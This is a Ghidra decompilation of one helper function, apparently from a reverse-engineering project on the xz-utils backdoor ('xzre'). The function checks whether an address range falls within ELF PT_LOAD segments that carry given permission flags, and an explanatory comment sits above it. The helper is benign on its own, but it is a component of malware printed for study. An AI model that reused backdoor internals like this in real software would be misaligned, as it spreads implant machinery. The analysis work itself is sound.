// /home/kali/xzre-ghidra/xzregh/101240_elf_contains_vaddr_impl.c
// Function: elf_contains_vaddr_impl @ 0x101240
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_contains_vaddr_impl(elf_info_t * elf_info, void * vaddr, u64 size, u32 p_flags)


/*
 * AutoDoc: Validates that `[vaddr, vaddr + size)` is entirely covered by one or more PT_LOAD segments whose `p_flags` mask includes the requested bits. The helper page-aligns both ends of the interval, walks every loadable program header, and recurses when the range straddles multiple segments so partial overlaps are rechecked piecemeal.
 *
 * It refuses to run more than 0x3ea iterations (preventing runaway recursion), insists that the candidate addresses live inside the mapped ELF image, and short-circuits to TRUE when `size` is zero. Callers pass `p_flags` values such as PF_X or PF_W to differentiate text, data, and RELRO spans.
 */
#include "xzre_types.h"


BOOL elf_contains_vaddr_impl(elf_info_t *elf_info,void *vaddr,u64 size,u32 p_flags)

{
  Elf64_Ehdr *pEVar1;
  BOOL BVar2;
  Elf64_Phdr *pEVar3;
  ulong uVar4;
  Elf64_Ehdr *pEVar5;
  Elf64_Ehdr *pEVar6;
  long lVar7;
  int in_R8D;
  
LAB_00101254:
  in_R8D = in_R8D + 1;
  pEVar1 = (Elf64_Ehdr *)(((Elf64_Ehdr *)vaddr)->e_ident + size);
  if (size == 0) {
LAB_0010138e:
    BVar2 = 1;
  }
  else {
    pEVar5 = pEVar1;
    if (vaddr <= pEVar1) {
      pEVar5 = (Elf64_Ehdr *)vaddr;
    }
    if ((elf_info->elfbase <= pEVar5) && (in_R8D != 0x3ea)) {
      lVar7 = 0;
      do {
        if ((uint)(ushort)elf_info->e_phnum <= (uint)lVar7) break;
        pEVar3 = elf_info->phdrs + lVar7;
        if ((pEVar3->p_type == 1) && ((pEVar3->p_flags & p_flags) == p_flags)) {
          uVar4 = (long)elf_info->elfbase + (pEVar3->p_vaddr - elf_info->first_vaddr);
          pEVar6 = (Elf64_Ehdr *)(pEVar3->p_memsz + uVar4);
          pEVar5 = (Elf64_Ehdr *)(uVar4 & 0xfffffffffffff000);
          if (((ulong)pEVar6 & 0xfff) != 0) {
            pEVar6 = (Elf64_Ehdr *)(((ulong)pEVar6 & 0xfffffffffffff000) + 0x1000);
          }
          if ((vaddr >= pEVar5) && (pEVar1 <= pEVar6)) goto LAB_0010138e;
          if ((pEVar1 > pEVar6) || (pEVar5 <= vaddr)) {
            if ((pEVar6 <= vaddr) || (vaddr < pEVar5)) {
              if ((pEVar6 < pEVar1) && (pEVar5 > vaddr)) {
                BVar2 = elf_contains_vaddr_impl(elf_info,vaddr,(long)pEVar5 - (long)vaddr,p_flags);
                if (BVar2 == 0) {
                  return 0;
                }
                BVar2 = elf_contains_vaddr_impl
                                  (elf_info,pEVar6->e_ident + 1,(long)pEVar1 + (-1 - (long)pEVar6),
                                   p_flags);
                return (uint)(BVar2 != 0);
              }
            }
            else if (pEVar6 < pEVar1) {
              vaddr = pEVar6->e_ident + 1;
              size = (long)pEVar1 - (long)vaddr;
              goto LAB_00101254;
            }
          }
          else if (pEVar5 < pEVar1) goto code_r0x00101313;
        }
        lVar7 = lVar7 + 1;
      } while( true );
    }
    BVar2 = 0;
  }
  return BVar2;
code_r0x00101313:
  size = (long)pEVar5 + (-1 - (long)vaddr);
  goto LAB_00101254;
}

